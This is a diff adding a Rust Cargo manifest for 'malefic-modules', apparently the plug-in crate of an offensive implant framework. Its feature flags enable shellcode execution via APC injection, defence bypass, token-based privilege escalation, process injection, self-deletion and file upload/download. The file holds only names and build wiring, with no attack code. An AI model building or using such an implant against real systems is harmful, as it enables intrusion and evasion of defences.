@@ -1,0 +1,159 @@
+cargo-features = ["profile-rustflags"]
+[package]
+name = "malefic-modules"
+version = "0.1.1"
+edition = "2021"
+
+[lib]
+name = "malefic_modules"
+path = "src/lib.rs"
+crate-type = ["cdylib", "rlib"]
+
+# [lib]
+# name = "custon-plugin"
+# crate-type = ["cdylib"]
+
+[features]
+
+default = ["full"]
+
+disable_register = []
+as_module_dll = ["malefic-module/ffi"]
+
+nano = []
+
+full = ["fs_full", "execute_full", "net_full", "sys_full"]
+
+base = [
+    "ls", "cd", "rm", "cp", "mv", "pwd", "cat", "upload", "download", "exec", "env", "info"
+]
+
+extend = [
+    "bypass",
+    "kill",
+    "whoami",
+    "ps",
+    "netstat",
+    "registry",
+    "service",
+    "taskschd",
+    "execute_bof",
+    "execute_shellcode",
+    "execute_assembly",
+    "execute_armory",
+    "execute_exe",
+    "execute_dll",
+    "execute_local",
+    "mkdir",
+    "touch",
+    "chmod"
+]
+
+fs_full = [
+    "ls", "cd", "rm", "cp", "mv", "pwd", "mem", "mkdir", "chown", "chmod", "cat", "touch", "pipe","enum_drivers"
+]
+
+enum_drivers = []
+
+ls = []
+cd = []
+rm = []
+cp = []
+mv = []
+pwd = []
+mem = []
+mkdir = []
+touch = []
+chmod = []
+chown = []
+cat = []
+pipe = ["malefic-os-win/pipe"]
+
+sys_full = [
+    "info", "ps", "id", "env", "whoami", "kill", "bypass", "netstat", "service", "inject",
+    "registry", "taskschd",
+    "getsystem", "runas", "privs", "rev2self",
+    "self_dele",
+    "wmi"
+]
+
+info = []
+ps = []
+id = []
+env = []
+whoami = []
+kill = []
+bypass = ["malefic-os-win/bypass"]
+netstat = []
+service = ["malefic-os-win/service"]
+registry = ["malefic-os-win/reg"]
+taskschd = ["malefic-os-win/scheduler"]
+getsystem = ["malefic-os-win/token"]
+runas = ["malefic-os-win/token"]
+rev2self = ["malefic-os-win/token"]
+privs = ["malefic-os-win/token"]
+inject = ["malefic-os-win/token"]
+self_dele = []
+wmi = ["malefic-os-win/wmi"]
+
+execute_full = [
+    "execute_assembly", 
+    "execute_powershell",
+    "dllspawn",
+    "inline_local",
+    "exec",
+    "open",
+    "execute_shellcode",
+    "execute_bof",
+    "execute_armory",
+    "execute_exe",
+    "execute_dll",
+    "execute_local"
+]
+
+exec = []
+open = []
+execute_shellcode = ["malefic-loader/Win_Inject_APC"]
+execute_bof = []
+execute_assembly = ["malefic-os-win/clr", "malefic-os-win/bypass", "malefic-sysinfo/clr"]
+execute_powershell = ["malefic-os-win/clr", "malefic-os-win/bypass", "malefic-sysinfo/clr"]
+execute_armory = []
+execute_exe = []
+execute_dll = []
+execute_local = []
+dllspawn = []
+thread_spawn_test = []
+inline_local = []
+
+net = []
+net_full = ["upload", "download"]
+
+upload = []
+download = []
+
+
+[dependencies]
+anyhow = { workspace = true }
+futures = { workspace = true }
+futures-channel = { workspace = true }
+futures-timer = { workspace = true }
+malefic-gateway = { workspace = true }
+malefic-features = { workspace = true }
+async-trait = { workspace = true }
+malefic-common = { workspace = true }
+malefic-process = { workspace = true }
+malefic-net = { workspace = true }
+malefic-sysinfo = { workspace = true }
+malefic-loader = { workspace = true }
+malefic-proto = { workspace = true }
+malefic-module = { workspace = true }
+tar = { workspace = true }
+
+[target.'cfg(target_os = "windows")'.dependencies]
+malefic-os-win = { workspace = true }
+
+
+[dev-dependencies]
+tokio = { workspace = true, features = ["rt", "rt-multi-thread", "macros", "time"] }
+futures-channel = { workspace = true }
+sha2 = { workspace = true }
